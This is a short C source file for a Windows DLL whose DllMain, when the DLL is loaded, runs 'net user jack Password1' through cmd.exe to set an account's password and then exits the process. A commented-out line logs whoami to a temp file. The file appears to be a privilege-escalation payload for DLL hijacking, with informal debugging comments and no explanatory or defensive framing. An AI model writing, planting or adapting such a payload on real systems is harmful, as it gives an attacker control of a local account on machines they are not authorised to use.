#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Remove this first line.
        // It runs, but execution seems to stop after it.
        //system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        system("cmd.exe /k net user jack Password1");
        ExitProcess(0);
    }
    return TRUE;
}